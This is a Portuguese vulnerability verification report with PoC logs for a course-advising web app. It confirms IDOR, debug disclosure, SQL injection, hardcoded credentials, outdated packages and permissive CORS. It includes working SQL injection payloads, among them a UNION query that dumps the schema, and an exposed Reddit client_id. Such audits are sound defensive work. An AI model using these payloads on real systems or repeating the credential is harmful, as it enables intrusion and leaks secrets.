# Relatório de Execução de Verificação de Vulnerabilidades (Fase 2 - PoCs)

- **Data da Execução:** 2026-10-27 15:40:46
- **Ambiente:** Local Isolado (Docker Compose, Firebase Emulator Suite, SQLite Local)

## 1. Sumário Executivo dos Testes de Verificação

| ID | Vulnerabilidade | Status Verificado | Severidade |
|---|---|---|---|
| `VULN-01` | Broken Access Control & IDOR | **CONFIRMADA (VULNERÁVEL)** | Alta (CVSS 7.5) |
| `VULN-02` | Debug Mode & Information Disclosure | **CONFIRMADA (VULNERÁVEL)** | Alta (CVSS 8.5) |
| `VULN-03` | SQL Injection em Consultas de Cursos | **CONFIRMADA (VULNERÁVEL)** | Alta (CVSS 7.5) |
| `VULN-04` | Hardcoded Credentials & Git Leakage | **CONFIRMADA (VULNERÁVEL)** | Alta (CVSS 7.5) |
| `VULN-05` | Outdated & Vulnerable Components | **CONFIRMADA (VULNERÁVEL)** | Alta (CVSS 8.6) |
| `VULN-06` | Permissive CORS & Token in Query String | **CONFIRMADA (VULNERÁVEL)** | Média (CVSS 6.5) |

---

## 2. Detalhamento e Logs de Execução das Verificações

### VULN-01: Broken Access Control & IDOR
- **Resultado:** `CONFIRMADA (VULNERÁVEL)`
```text
============================================================
[TESTE VULN-01] Broken Access Control & IDOR Verification
============================================================
[+] Alice UID: qMTPJIy7Q98CqX8ZjOszLXgxlKcd
[+] Bob UID:   sATcBPHwGOP1Vv6bpHVaKXLyNhmw

[Passo 1] Alice cria uma conversa confidencial no Realtime Database...
[+] Conversa da Alice criada com sucesso (HTTP 200).

[Passo 2] Bob (usuário não autorizado) tenta ler os dados confidenciais da Alice...
[*] Código retornado para Bob: 200

[ALERTA DE VULNERABILIDADE DETECTADO] VULN-01 CONFIRMADA!
[!] Bob conseguiu ler o chat de Alice sem restrição:
{
  "created_at": "2026-10-27T10:00:00Z",
  "messages": {
    "msg-01": {
      "sender": "Alice",
      "text": "Mensagem confidencial com notas e histórico."
    },
    "msg-02": {
      "sender": "Advisor",
      "text": "Seus dados foram atualizados com sucesso."
    }
  },
  "title": "Aconselhamento Academico Privado"
}

[Passo 3] Bob tenta deletar a conversa da Alice via DELETE /chats/<chat_id> no Backend...
[*] Resposta do Backend: 200 - {"message":"Message deleted successfully"}
```

### VULN-02: Debug Mode & Information Disclosure
- **Resultado:** `CONFIRMADA (VULNERÁVEL)`
```text
============================================================
[TESTE VULN-02] Verificação de Debug Mode e Stack Trace Exposure
============================================================
[*] Enviando requisição para rota propositalmente inválida em http://localhost:5000/nonexistent-route...
[*] Código retornado: 404

[*] Enviando requisição malformada para /chats/trigger_error/messages sem JSON body...
[*] Código retornado: 400
[*] Headers da resposta: {'Server': 'gunicorn', 'Date': 'Tue, 27 Oct 2026 18:40:42 GMT', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Content-Length': '78', 'Access-Control-Allow-Origin': '*'}
[*] Server Header: gunicorn

[*] Testando /users/info com token malformado...
[*] Código retornado: 400
[*] Corpo da resposta (vazamento de erro interno): {"error":"Error getting user info: Error verifying ID token: Wrong number of segments in token: b'malformed_token_123'"}


[ALERTA DE VULNERABILIDADE DETECTADO] VULN-02 CONFIRMADA!
[!] Configuração 'app.run(debug=True)' ativa no código de produção.
[!] Exposição de mensagens internas de erro/exceção da SDK no corpo da resposta HTTP.
```

### VULN-03: SQL Injection em Consultas de Cursos
- **Resultado:** `CONFIRMADA (VULNERÁVEL)`
```text
============================================================
[TESTE VULN-03] Verificação de SQL Injection (blueprints/courses.py)
============================================================

[1] Executando consulta legítima com semester='FA23'...
    SQL: SELECT * FROM courses WHERE semester = 'FA23'
    Total de cursos encontrados: 0

[2] Executando consulta com payload malicioso: semester="' OR '1'='1"...
    SQL Resultante: SELECT * FROM courses WHERE semester = '' OR '1'='1'
    Total de registros retornados (Bypass total): 10

[3] Testando UNION-based SQLi para extração do schema:
    SQL Resultante: SELECT * FROM courses WHERE semester = '' UNION SELECT 9999, 'SCHEMA_DUMP', 0, 'FA23', 'SEC', sql FROM sqlite_master WHERE type='table' --'
    [+] Dados extraídos via UNION (5 linhas):
       -> (9999, 'SCHEMA_DUMP', 0, 'FA23', 'SEC', 'CREATE TABLE course_descriptions (\n        id INTEGER PRIMARY KEY,\n        course_id INTEGER,\n        description TEXT,\n        FOREIGN KEY (course_id) REFERENCES courses(id)\n    )')
       -> (9999, 'SCHEMA_DUMP', 0, 'FA23', 'SEC', 'CREATE TABLE courses (\n        id INTEGER PRIMARY KEY,\n        name TEXT NOT NULL,\n        section_id INTEGER,\n        semester TEXT,\n        department TEXT,\n        instructor TEXT\n    )')
       -> (9999, 'SCHEMA_DUMP', 0, 'FA23', 'SEC', 'CREATE TABLE reddit_comments (\n        comment_id INTEGER PRIMARY KEY AUTOINCREMENT,\n        post_id INTEGER,\n        subreddit TEXT,\n        username TEXT,\n        user_id TEXT,\n        parent_id TEXT,\n        score INTEGER,\n        created_utc INTEGER,\n        body TEXT,\n        permalink TEXT,\n        ts TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n        FOREIGN KEY (post_id) REFERENCES reddit_posts(post_id)\n    )')
       -> (9999, 'SCHEMA_DUMP', 0, 'FA23', 'SEC', 'CREATE TABLE reddit_posts (\n        post_id INTEGER PRIMARY KEY AUTOINCREMENT,\n        subreddit TEXT,\n        title TEXT,\n        url TEXT,\n        author TEXT,\n        score INTEGER,\n        num_comments INTEGER,\n        created_utc INTEGER,\n        selftext TEXT,\n        permalink TEXT,\n        ts TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n    )')
       -> (9999, 'SCHEMA_DUMP', 0, 'FA23', 'SEC', 'CREATE TABLE sqlite_sequence(name,seq)')

[ALERTA DE VULNERABILIDADE DETECTADO] VULN-03 CONFIRMADA!
[!] A concatenação direta via f-string permitiu alterar a lógica da query e despejar todo o banco.
```

### VULN-04: Hardcoded Credentials & Git Leakage
- **Resultado:** `CONFIRMADA (VULNERÁVEL)`
```text
============================================================
[TESTE VULN-04] Verificação de Credenciais Hardcoded e Histórico Git
============================================================

[1] Verificando existência de C:\Users\luizf\OneDrive\Documentos\PROGRAMAÇÃO\PS\CourseSphere\backend\cornell-course-sphere-data\reddit-data\reddit_key.json...
    [!] ARQUIVO PRESENTE NO DIRETÓRIO DE TRABALHO:
        client_id:     7rtaqvFp68AC8uOvSIUl_w
        client_secret: **************************ao3w

[2] Verificando histórico de commits do Git para credenciais vazadas...
    [!] Commits no histórico contendo chaves sensíveis:
        -> 66259db Dwain-Anderson 2024-08-02 Quick changes
        -> 68e6a44 Dwain-Anderson 2024-08-02 Progress on backend, and frontend API, refractored code and added firebase.py to begin fully implementing the chat features.
        -> c979a1e Dwain-Anderson 2024-07-16 merge
        -> 9303a34 Dwain-Anderson 2024-07-09 Updated backend with reddit data and course data.

[3] Evidência automatizada em C:\Users\luizf\OneDrive\Documentos\PROGRAMAÇÃO\PS\CourseSphere\docs\evidencias\sast\git_secrets_audit.json:
    Total de ocorrências de segredos detectadas: 17

[ALERTA DE VULNERABILIDADE DETECTADO] VULN-04 CONFIRMADA!
[!] Credenciais ativas ou sensíveis expostas:
    - reddit_key.json no working directory
    - Segredos no histórico do Git
    - 17 segredos catalogados no SAST
```

### VULN-05: Outdated & Vulnerable Components
- **Resultado:** `CONFIRMADA (VULNERÁVEL)`
```text
============================================================
[TESTE VULN-05] Verificação de Componentes Desatualizados e Vulneráveis
============================================================

[1] Auditoria Frontend (NPM):
    - Críticas: 2
    - Altas:    19
    - Moderadas:17
    - Baixas:   1
    - Total:    39

    Principais pacotes comprometidos identificados:
      * tar (high) - via ['CVE-2024-28863', 'GHSA-m6fv-jmc8-4pc4']
      * glob (high) - via ['CVE-2024-4067', 'GHSA-52rv-627v-3559']
      * inflight (moderate) - via ['GHSA-vjh7-4vhj-5chp']
      * rimraf (moderate) - via ['GHSA-9265-27f3-ff5j']
      * semver (high) - via ['CVE-2022-25883', 'GHSA-c2qf-rxjj-qqgw']

[2] Auditoria Backend (PIP):
    - Dependências analisadas: 58

[ALERTA DE VULNERABILIDADE DETECTADO] VULN-05 CONFIRMADA!
[!] Aplicação depende de 2 pacotes com severidade CRÍTICA e 19 com severidade ALTA.
```

### VULN-06: Permissive CORS & Token in Query String
- **Resultado:** `CONFIRMADA (VULNERÁVEL)`
```text
============================================================
[TESTE VULN-06] Verificação de CORS Permissivo e Token na Query String
============================================================

[1] Testando política CORS com Origin malicioso (https://evil-attacker.site)...
    Código de resposta Preflight: 200
    Access-Control-Allow-Origin:  https://evil-attacker.site
    [!] CORS Permissivo detectado! Qualquer origem externa pode fazer requisições.

[2] Testando passagem de token via query parameter em GET /users/info...
    URL enviada (exposta em access logs, proxies e histórico):
    -> http://localhost:5000/users/info?id_token=eyJhbGciOiJub25lIi...[TRUNCATED TOKEN]
    Código de resposta: 200
    [!] A aplicação aceitou com sucesso o JWT via URL query parameter.
    Dados retornados: None

[ALERTA DE VULNERABILIDADE DETECTADO] VULN-06 CONFIRMADA!
[!] Foram comprovadas falhas de exposição de token em URL e/ou CORS permissivo.
```

